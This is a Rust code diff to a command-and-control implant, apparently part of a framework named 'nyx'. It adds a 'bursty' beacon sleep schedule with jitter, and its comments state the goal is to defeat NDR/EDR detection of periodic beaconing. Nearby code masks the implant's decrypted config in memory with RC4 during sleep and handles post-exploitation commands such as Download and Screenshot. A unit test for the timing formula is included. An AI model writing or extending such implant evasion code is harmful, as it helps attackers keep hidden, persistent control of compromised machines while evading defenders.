@@ -26,6 +26,12 @@ use nyx_protocol::{
 /// single beacon thread.
 static SLEEP_SECS: core::sync::atomic::AtomicU32 = core::sync::atomic::AtomicU32::new(5);
 
+/// Per-implant timing override (L4 wire u8). 0 inherit / 1 uniform / 2 bursty.
+static TIMING_BASELINE: core::sync::atomic::AtomicU8 = core::sync::atomic::AtomicU8::new(0);
+
+/// Bursty cadence cycle counter (agent-dev `BURST_LEN = 4`).
+static SLEEP_CYCLE: core::sync::atomic::AtomicU32 = core::sync::atomic::AtomicU32::new(0);
+
 /// Margin kept under `protocol::frame::MAX_CT_LEN` (512 KiB) when batching
 /// responses into one frame. A streamed Download or Screenshot can exceed the
 /// frame cap; we flush early when the accumulated batch would cross this.
@@ -145,6 +151,7 @@ fn beacon_init_config() -> (Config, ImplantConfig) {
             (c, ImplantConfig::default(), p)
         };
     SLEEP_SECS.store(cfg.sleep_seconds, core::sync::atomic::Ordering::Relaxed);
+    TIMING_BASELINE.store(cfg.timing_baseline, core::sync::atomic::Ordering::Relaxed);
 
     // Leak the decrypted config plaintext and register it with the memory
     // mask so it is RC4-encrypted during sleep.
@@ -1465,9 +1472,26 @@ fn execute_postex(cmd: Command) -> Vec<Response> {
 
 /// Sleep `base` seconds, varied by ±jitter_pct% so beacon timing isn't a
 /// metronome (a fixed-period beacon is a trivial NDR/EDR signature).
+///
+/// When bursty (per-implant override or baked `timing_baseline`), the chosen
+/// base follows [`nyx_implant_net::timing::bursty_delay`] (`BURST_LEN = 4`)
+/// and jitter is applied inside that chosen base. `base == 0` is still a no-op.
 fn sleep_jitter(base: u32, jitter_pct: u8) {
-    if jitter_pct == 0 || base == 0 {
-        crate::kits::sleep(base);
+    if base == 0 {
+        crate::kits::sleep(0);
+        return;
+    }
+    let bursty = nyx_implant_net::timing::is_bursty(
+        TIMING_BASELINE.load(core::sync::atomic::Ordering::Relaxed),
+    );
+    let chosen = if bursty {
+        let cycle = SLEEP_CYCLE.fetch_add(1, core::sync::atomic::Ordering::Relaxed);
+        nyx_implant_net::timing::bursty_delay(cycle, base)
+    } else {
+        base
+    };
+    if jitter_pct == 0 {
+        crate::kits::sleep(chosen);
         return;
     }
     // Cheap LCG over a static seed — no need for a CSPRNG here (this only
@@ -1481,10 +1505,16 @@ fn sleep_jitter(base: u32, jitter_pct: u8) {
     x ^= x >> 17;
     x ^= x << 5;
     SEED.store(x, core::sync::atomic::Ordering::Relaxed);
-    let span = (base as u32).saturating_mul(jitter_pct as u32) / 100;
+    let span = chosen.saturating_mul(jitter_pct as u32) / 100;
     let off = if span > 0 { x % (2 * span) } else { 0 };
-    let actual = base.saturating_add(off).saturating_sub(span);
+    let actual = chosen.saturating_add(off).saturating_sub(span);
     crate::kits::sleep(actual.max(1));
+}
+
+/// Host-testable re-export of the bursty cadence (seconds).
+#[cfg(test)]
+fn bursty_delay(cycle: u32, base: u32) -> u32 {
+    nyx_implant_net::timing::bursty_delay(cycle, base)
 }
 
 // ── Tests ────────────────────────────────────────────────────────────────────
@@ -1525,11 +1555,29 @@ mod tests {
             proxy_server: String::new(),
             tcp_peer_host: String::new(),
             tcp_peer_port: 0,
+            timing_baseline: 0,
         }
     }
 
     fn test_ctx() -> nyx_implant_net::channels::ChannelCtx {
         nyx_implant_net::channels::ChannelCtx::from_config(&test_cfg())
+    }
+
+    #[test]
+    fn bursty_delay_matches_agent_dev_formula() {
+        // Same BURST_LEN=4 cadence as agent-dev `bursty_sleep`, in seconds:
+        // in-burst = max(1, base/8), quiet gap = base.
+        let base = 60u32;
+        for c in 0..10u32 {
+            let d = bursty_delay(c, base);
+            if c % 5 == 4 {
+                assert_eq!(d, base, "cycle {c} should be the long gap");
+            } else {
+                assert_eq!(d, 7, "cycle {c} in-burst = base/8");
+            }
+        }
+        assert_eq!(bursty_delay(0, 1), 1);
+        assert_eq!(bursty_delay(4, 1), 1);
     }
 
     #[test]
